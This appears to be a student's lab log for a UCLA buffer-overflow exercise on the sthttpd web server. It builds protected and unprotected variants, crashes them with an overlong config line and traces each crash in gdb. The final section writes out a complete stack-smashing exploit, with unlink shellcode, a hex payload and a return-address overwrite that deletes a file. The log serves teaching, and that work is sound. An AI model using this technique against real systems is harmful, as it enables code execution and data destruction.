@@ -1,0 +1,401 @@
+1. 
+wget http://web.cs.ucla.edu/classes/fall17/cs33/lab/sthttpd-2.27.0.tar.gz
+tar -xvzf sthttpd-2.27.0.tar.gz
+download and untar the sthttpd 2.27.0 
+
+emacs patch.diff
+copy the content of patch into the pathc.diff
+
+patch -p0 < patch.diff
+run the patch
+
+cd sthttpd-2.27.0/src 
+emacs thttpd.c
+emacs libhttpd.c
+check that the patch successfully modifies the source code
+
+2.
+export PATH="/usr/local/cs/bin:$PATH"
+which gcc
+make sure to change the PATH
+
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+make clean 
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+3. 4.
+my ID is 004757414, so 4757414 % 293 = 266 
+port for sp: 13129  as: 13130  no: 13131
+
+echo 'The server is running.' > foo.txt
+run another PUTTY and cd to /sthttpd-2.27.0
+
+src/thttpd-sp -p 13129 -D
+curl http://localhost:13129/foo.txt
+The server is running.
+
+src/thttpd-as -p 13130 -D
+curl http://localhost:13130/foo.txt
+The server is running.
+
+src/thttpd-no -p 13131 -D
+curl http://localhost:13131/foo.txt
+The server is running.
+
+5.
+write a c program that prints 400 'a' characters 
+run the program and store the output in config.txt
+add "port=" at the start of config.txt
+This will crash the sthttpd-sp as it surpasses the size of the array the read_config function uses.
+
+gdb sthttpd-2.27.0/src/sthttpd-sp 
+r -p 13129 -D -C config.txt
+------------------------------
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.20/class/classrzw/cs33/lab3/sthttpd-2.27.0/src/thttpd-sp terminated
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+------------------------------
+backtrace 
+#0  0x00007ffff6daf118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db0019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e5376 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff764df64 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404edd in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x6161616161616161 in ?? ()
+#10 0x6161616161616161 in ?? ()
+#11 0x6161616161616161 in ?? ()
+#12 0x6161616161616161 in ?? ()
+#13 0x6161616161616161 in ?? ()
+#14 0x6161616161616161 in ?? ()
+#15 0x6161616161616161 in ?? ()
+#16 0x6161616161616161 in ?? ()
+#17 0x6161616161616161 in ?? ()
+#18 0x6161616161616161 in ?? ()
+#19 0x6161616161616161 in ?? ()
+#20 0x6161616161616161 in ?? ()
+#21 0x6161616161616161 in ?? ()
+-----------------------------
+we know that it is the read_config function which causes the bug 
+break 1190
+set up a breakpoint at 1190 as 1190 is where the read_config function ends
+set disassemble-next-line on
+------------------------------
+=> 0x0000000000404e10 <read_config+1120>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+   0x0000000000404e15 <read_config+1125>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+   0x0000000000404e1e <read_config+1134>:       0f 85 b4 00 00 00       jne    0x404ed8 <read_config+1320>
+   0x0000000000404e24 <read_config+1140>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404e28 <read_config+1144>:       5b      pop    %rbx
+   0x0000000000404e29 <read_config+1145>:       5d      pop    %rbp
+   0x0000000000404e2a <read_config+1146>:       41 5c   pop    %r12
+   0x0000000000404e2c <read_config+1148>:       41 5d   pop    %r13
+   0x0000000000404e2e <read_config+1150>:       41 5e   pop    %r14
+   0x0000000000404e30 <read_config+1152>:       c3      retq
+
+after two si:
+0x0000000000404e1e      1190        }
+   0x0000000000404e10 <read_config+1120>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+   0x0000000000404e15 <read_config+1125>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+=> 0x0000000000404e1e <read_config+1134>:       0f 85 b4 00 00 00       jne    0x404ed8 <read_config+1320>
+   0x0000000000404e24 <read_config+1140>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404e28 <read_config+1144>:       5b      pop    %rbx
+   0x0000000000404e29 <read_config+1145>:       5d      pop    %rbp
+   0x0000000000404e2a <read_config+1146>:       41 5c   pop    %r12
+   0x0000000000404e2c <read_config+1148>:       41 5d   pop    %r13
+   0x0000000000404e2e <read_config+1150>:       41 5e   pop    %r14
+   0x0000000000404e30 <read_config+1152>:       c3      retq
+(gdb) si
+1190        }
+=> 0x0000000000404ed8 <read_config+1320>:       e8 a3 d5 ff ff  callq  0x402480 <__stack_chk_fail@plt>
+
+so
+   0x0000000000404e15 <read_config+1125>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+   0x0000000000404e1e <read_config+1134>:       0f 85 b4 00 00 00       jne    0x404ed8 <read_config+1320>
+is the instruction that causes the crash, because the xor compares the canary value which is a protection value to detect buffer overflow. 
+Since the config.txt exploits the stack and causes an overflow, the instruction detects it by comparing the canary value and finding out that it is not equal,
+so it jumps to the callq instruction to call the __stack_chk_fail function and terminates the program.
+
+6.
+uses the same steps as -sp 
+gdb sthttpd-2.27.0/src/thttpd-as
+r -p 13130 -D -C config.txt
+
+=================================================================
+==18911==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffceb4 at pc 0x000000441de4 bp 0x7fffffffce10 sp 0x7fffffffc5c0
+READ of size 407 at 0x7fffffffceb4 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+
+----------------------------
+backtrace
+
+#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (this=0x7fffffffb0c0, pc=4464100, max_depth=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext (fast=false, context=0x0, bp=140737488342544, pc=4464100, max_depth=256, stack=0x7fffffffb0c0)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+#4  __asan::ErrorGeneric::Print (this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (this=0x980140 <__asan::ScopedInErrorReport::current_error_>) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb937, __in_chrg=<optimized out>) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342544, sp=sp@entry=140737488340416, addr=addr@entry=140737488342708, is_write=is_write@entry=false,
+    access_size=access_size@entry=407, exp=0, fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>) at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1018
+#10 0x6161616161616161 in ?? ()
+#11 0x6161616161616161 in ?? ()
+#12 0x6161616161616161 in ?? ()
+#13 0x6161616161616161 in ?? ()
+#14 0x6161616161616161 in ?? ()
+#15 0x6161616161616161 in ?? ()
+#16 0x6161616161616161 in ?? ()
+#17 0x6161616161616161 in ?? ()
+#18 0x6161616161616161 in ?? ()
+#19 0x6161616161616161 in ?? ()
+#20 0x6161616161616161 in ?? ()
+#21 0x6161616161616161 in ?? ()
+#22 0x6161616161616161 in ?? ()
+#23 0x6161616161616161 in ?? ()
+#24 0x6161616161616161 in ?? ()
+#25 0x6161616161616161 in ?? ()
+#26 0x6161616161616161 in ?? ()
+#27 0x6161616161616161 in ?? ()
+#28 0x6161616161616161 in ?? ()
+#29 0x6161616161616161 in ?? ()
+#30 0x6161616161616161 in ?? ()
+#31 0x6161616161616161 in ?? ()
+#32 0x6161616161616161 in ?? ()
+#33 0x00000a6161616161 in ?? ()
+#34 0x00000000004d12c9 in __asan::GetCurrentThread () at ../../../../gcc-7.2.0/libsanitizer/asan/asan_thread.cc:343
+#35 0x00000000004cfc99 in __asan::GetCurrentThreadStats () at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stats.cc:116
+#36 0x000000000040aa19 in __asan::AsanMapUnmapCallback::OnMap (this=<optimized out>, p=<optimized out>, size=7016996765293437281)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_allocator.cc:177
+#37 0x00000000005252ba in ?? ()
+#38 0x0000000000000000 in ?? ()
+---------------------------------------------------------
+set disassemble-next-line on
+break 1018
+r -p 13130 -D -C config.txt
+
+
+then there is an insruction 
+=> 0x00000000004feb53 <read_config+179>:        e8 f8 34 f4 ff  callq  0x442050 <__interceptor_strchr(char const*, int)>
+The instruction calls the __interceptor_strchr function and exits read_config, the code then goes through different function like 
+__asan_region_is_poisoned  and then the program ends somehow in the middle.
+So it seems that the __interceptor_strchr function checks the buffer overflow and as there is overflow, the function terminates the program.
+
+7.
+gdb sthttpd-2.27.0/src/thttpd-no
+r -p 13131 -D -C config.txt
+------
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+-----
+backtrace
+#0  0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+#3  0x6161616161616161 in ?? ()
+#4  0x6161616161616161 in ?? ()
+#5  0x6161616161616161 in ?? ()
+#6  0x6161616161616161 in ?? ()
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x6161616161616161 in ?? ()
+#10 0x6161616161616161 in ?? ()
+#11 0x6161616161616161 in ?? ()
+#12 0x6161616161616161 in ?? ()
+#13 0x6161616161616161 in ?? ()
+#14 0x6161616161616161 in ?? ()
+#15 0x6161616161616161 in ?? ()
+#16 0x6161616161616161 in ?? ()
+#17 0x6161616161616161 in ?? ()
+#18 0x6161616161616161 in ?? ()
+#19 0x6161616161616161 in ?? ()
+#20 0x6161616161616161 in ?? ()
+#21 0x6161616161616161 in ?? ()
+#22 0x6161616161616161 in ?? ()
+#23 0x6161616161616161 in ?? ()
+#24 0x6161616161616161 in ?? ()
+#25 0x6161616161616161 in ?? ()
+#26 0x6161616161616161 in ?? ()
+#27 0x6161616161616161 in ?? ()
+#28 0x6161616161616161 in ?? ()
+#29 0x6161616161616161 in ?? ()
+#30 0x6161616161616161 in ?? ()
+#31 0x6161616161616161 in ?? ()
+#32 0x0000006161616161 in ?? ()
+#33 0x0000000000000000 in ?? ()
+-----------
+set disassemble-next-line on
+break 1190
+r -p 13131 -D -C config.txt
+=> 0x0000000000404c80 <read_config+1104>:       48 83 c4 70     add    $0x70,%rsp
+   0x0000000000404c84 <read_config+1108>:       5b      pop    %rbx
+   0x0000000000404c85 <read_config+1109>:       5d      pop    %rbp
+   0x0000000000404c86 <read_config+1110>:       41 5c   pop    %r12
+   0x0000000000404c88 <read_config+1112>:       41 5d   pop    %r13
+   0x0000000000404c8a <read_config+1114>:       41 5e   pop    %r14
+   0x0000000000404c8c <read_config+1116>:       c3      retq
+
+after several si:
+=> 0x0000000000404c8c <read_config+1116>:       c3      retq
+(gdb) si
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404c8c in read_config (filename=<optimized out>) at thttpd.c:1190
+
+so  => 0x0000000000404c8c <read_config+1116>:       c3      retq     causes the crash.
+As there is no buffer overflow check, the code direcly causes retq and gets an error, so the reason might be that the read_config function overwrites
+the %rax address, so the code doesn't know where to find the return value.
+
+
+8.
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong
+mv src/thttpd.o src/thttpd-sp.s'
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s	
+
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+diff -u thttpd-sp.s thttpd-as.s > spas.diff
+diff -u thttpd-sp.s thttpd-no.s > spno.diff
+diff -u thttpd-as.s thttpd-no.s > asno.diff
+compare the three assembly code by diff 
+
+There are 12288 lines in spas.diff, so there is a lot difference.The handle_read function is totally different, there is little in common but obviusly
+ there are a lot more codes in green which belongs to thttpd-as.s.
+There are only 3485 lines in spno.diff and I don't even find the implementation of handle_read in the spno.diff, which means they are basically the same.
+There are 12185 lines in noas.diff and the handle_read is totally different with much more code of thttpd-as.s .
+
+So from the result of diff and gdb, the  -fstack-protector-strong only changes a little of -no, possibly the
+xor    %fs:0x28,%rax                 jne    0x404ed8 <read_config+1320>
+just to check the canary value and call the fail funtion to end the program if the canary value is not ok.
+
+-fsanitize=address,on the other side, changes a lot by checking shadow memory by calling  __interceptor_strchr.
+
+
+9.
+touch target.txt
+create the target file we want to remove later
+
+gdb sthttpd-2.27.0/src/thttpd-no
+try to find the length from the start of the array to the return address
+
+break read_config
+r -p 13131 -D -C config.txt
+print $line
+$1 = (char (*)[100]) 0x7fffffffcfd0
+info register $rsp:
+rsp            0x7fffffffd068   0x7fffffffd068
+
+so the size we must overflow is 0xd068 - 0xcf60 = 152 bytes 
+
+
+we want to use unlink the system call but don't know the syscall number of unlink. I write the c code:
+
+#include<unistd.h>
+int main()
+{
+  unlink("target.txt");
+  return 0;
+}
+
+gcc test.c -o test
+gdb test
+break unlink
+disass:
+=> 0x00007ffff7b02f70 <+0>:     mov    $0x57,%eax
+   0x00007ffff7b02f75 <+5>:     syscall
+so now we know that 0x57 is the syscall number to pass for unlink
+
+
+emacs target.txt
+I input the string "target.txt" in it.
+xdd target.txt 
+0000000: 7461 7267 6574 2e74 7874 0a              target.txt.
+
+I copied the hex value into hex.txt and changes 0a to 00 as 0a stands for the newline character and is not needed
+I want to use hex2raw but somehow the server cannot find the directory, so I am doing it by hand.
+convert the hex value in hex.txt into two-digit hex values
+get the hex value for "port=" with alignment with same method: 70 6f 72 74 3d 00 00 00
+
+There are 11 two-digit hex value to add, and to meet alignment requirement of 8, we should add 16 before start. So the argument to start is 0x7fffffffd068 -16 =  0x7fffffffd058 
+write corresponding assembly code in delete.s:
+        movq $0x57, %rax
+        movq $0x7fffffffd058, %rdi
+        syscall
+
+gcc -c delete.s
+objdump -d delete.o > delete.asm
+
+   0:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+   7:   48 bf 58 d0 ff ff ff    movabs $0x7fffffffd058,%rdi
+   e:   7f 00 00
+  11:   0f 05                   syscall
+
+
+there are 19+16+8 = 43 bytes , so we need 152-43= 109 bytes to fill.
+I write a output.c to print 109 "00 "
+combining them together and add the address of the start of array +8 for return address at last (little endian !!!)
+format them in hex.txt
+the hex values are:
+0000000: 70 6f 72 74 3d 00 00 00 48 c7 c0 57 00 00 00 48
+0000010: bf 58 d0 ff ff ff 7f 00 00 0f 05 00 00 00 00 00
+0000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0000080: 00 00 00 00 00 00 00 00 74 61 72 67 65 74 2e 74
+0000090: 78 74 00 00 00 00 00 00 d8 cf ff ff ff 7f 00 00
+
+xxd -r hex.txt > attack.txt
+convert it to hex string
+
+ls target.txt
+check that target.txt exists
+
+gdb sthttpd-2.27.0/src/thttpd-no
+r -p 13131 -D -C attack.txt
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffcfeb in ?? ()
+quit gdb
+
+ls target.txt
+ls: cannot access 'target.txt': No such file or directory
+
+
+we successfully deletes target.txt!!!
+------------
+
+files to hand in:
+hex.txt --- the hex values of the code
+attack.txt --- the hex string converted from hex.txt
+delete.s ---- the assembly code for delete target.txt
+test.c ---- c code used to find syscall value to unlink
+create.c --- c code to create hex values to fill the hex.txt
+
